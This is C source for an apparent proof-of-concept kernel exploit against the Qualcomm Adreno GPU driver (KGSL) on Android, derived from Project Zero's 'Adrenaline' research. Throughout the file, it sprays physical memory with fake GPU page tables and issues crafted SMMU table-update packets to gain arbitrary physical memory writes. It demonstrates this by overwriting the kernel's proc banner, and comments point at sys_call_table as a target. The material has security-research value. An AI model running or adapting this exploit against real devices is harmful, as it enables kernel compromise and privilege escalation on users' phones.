#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
 * the race condition with the targeted context switch */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            /* the shift here is helpful for debugging failed alignment */
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
// increased this from 1G to 2G for Pixel 3 XL
#define NPBUFS 128

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* "outer attributes are exported from the processor to the external memory bus
 * and are therefore potentially used by cache hardware external to the core or
 * cluster" */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        // zhuowei: always have a self mapping
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
    }

    return 0;
}

#define DUMP_PAGEMAP
#ifdef DUMP_PAGEMAP
// https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
// https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
    uint64_t pagemap_data = 0;
    if (pread(pagemap_fd, &pagemap_data, sizeof(pagemap_data), (virt / 4096ull) * sizeof(uint64_t)) != sizeof(pagemap_data)) {
        return 0;
    }
    uint64_t mask = (1ull << 55) - 1; // bits 0-54
    return (pagemap_data & mask) * 4096;
}
#endif

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

int main() {
#ifdef DUMP_PAGEMAP
    int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
#endif
    // from Adrenaline: spray physical memory
    /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
     *
     * it's chosen more or less at random based on results of performing a similar spray and then
     * checking commonly recurring entries in /proc/self/pagemap
     */
    uint64_t phyaddr = 0xfebeb000;

    /* spray 16mb per mapping */
    uint64_t pbuf_len = PAGE_SIZE * 4096;
    uint8_t *pbufs[NPBUFS];

    /* this loop is spraying a fake page table so that it hopefully lands at a fixed physical
     * address. one way that the exploit can fail is if this page has already been allocated,
     * in which case a reboot might be necessary */
    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        /* our fake gpuaddress (0x40403000) is chosen to allow level1/2/3 to be at different
         * offsets within the same page (e.g. level 1 = 0x1, level2 = 0x3, level3 = 0x3.
         *
         * the target physical page (0x821D9000) corresponds to sys_call_table, which is at
         * a fixed physical address that you can calculate by taking the base of "Kernel Code"
         * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
        // zhuowei: actually, try to write to itself, please...
        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, 0x40403000, phyaddr);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        //fprintf(stderr, "spray %p\n", pbuf);
#ifdef DUMP_PAGEMAP
        if (pagemap_fd != -1) {
            for (int off = 0; off < pbuf_len; off += 4096) {
                void* page_start = pbuf + off;
                fprintf(stderr, "addr: %p %p\n", page_start, (void*)GetPhys(pagemap_fd, (uint64_t)page_start));
            }
        }
#endif
    }
    // end spray
    //fprintf(stderr, "end spray\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    // Sign of life: just ask the GPU to write something...

    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40403100);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
#if 1
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
#endif
#if 1
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_INDIRECT_BUFFER, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf);
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    payload_cmds += cp_gpuaddr(payload_cmds, phyaddr);
    *payload_cmds++ = 0;
    *payload_cmds++ = 0;
    payload_cmds += cp_wait_for_me(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_CONTEXT_SWITCH_YIELD, 4);
    payload_cmds += cp_gpuaddr(payload_cmds, 0); // no
    *payload_cmds++ = 0;
    *payload_cmds++ = 0;
    // would this exit the thing?
    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567842424242);
    *payload_cmds++ = 0;
    *payload_cmds++ = 0;
    payload_cmds += cp_wait_for_me(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567843434343);
    *payload_cmds++ = 0;
    *payload_cmds++ = 0;
    payload_cmds += cp_wait_for_me(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567844444444);
    *payload_cmds++ = 0;
    *payload_cmds++ = 0;
    payload_cmds += cp_wait_for_me(payload_cmds);
    payload_cmds += cp_wait_for_idle(payload_cmds);
#endif
#if 0
// let's see how long this lives for...
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x41414141;
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x42424242;
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x43434343;
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x44444444;
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, 0x40403100);
    *payload_cmds++ = 0x41414141;
#endif

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    sleep(1);
    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
        printf("%x ", payload_buf[i]);
    }
    printf("\n");
    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
    if (err) {
        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
        return 1;
    }

    sleep(1);
    fprintf(stderr, "%x %x\n", output_buf[0], output_buf[1]);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    // we don't need these anymore...
    for (int i = 0; i < NPBUFS; i++) {
        if (i == target_pbuf) {
            continue;
        }
        void* pbuf = pbufs[i];
        munmap(pbufs[i], pbuf_len);
        pbufs[i] = NULL;
    }

    // TODO(zhuowei): refactor out into function...

    uint64_t garbage_size = 16*1024*1024;
    void* garbage = malloc(garbage_size);

    // /proc/iomem:
    // 80080000-823fffff : Kernel code
    // 82c00000-83885fff : Kernel data
    // /proc/kallsyms:
    // ffffff80acbaa017 r linux_proc_banner
    // ffffff80aac80000 T _text
    uint64_t target_write_physical_address = 0x80080000ull + (0xffffff80acbaa018ull - 0xffffff80aac80000ull);

    setup_pagetables(target_physical_page, 1, phyaddr, 0x40403000, target_write_physical_address & ~0xfffull);

    // TODO(zhuowei): this needs to be refactored...
    drawstate_cmds = drawstate_buf;
#if 1
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
#endif
#if 1
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40403000 + (target_write_physical_address & 0xfffull));
    *drawstate_cmds++ = 'p';
#endif
#if 1
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40404100);
    *drawstate_cmds++ = 0x41414141;
#endif
#if 0
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *drawstate_cmds++ = 0x41414141;
#endif

    payload_cmds = payload_buf;
#if 1
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
#endif
#if 1
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x42424242;
#endif

    cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    volatile uint32_t* target_marker = target_physical_page + 0x100;
    fprintf(stderr, "here: %x\n", target_marker[0]);
    // stupid cache flush+invalidate:
    memset(garbage, 0x1, garbage_size);

    sleep(1);
    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
        printf("%x ", payload_buf[i]);
    }
    printf("\n");
    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
    if (err) {
        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
        return 1;
    }

    sleep(1);
    memset(garbage, 0x1, garbage_size);

    fprintf(stderr, "reread: %x\n", target_marker[0]);

    err = kgsl_ctx_destroy(fd, ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(fd);
    return 0;
}
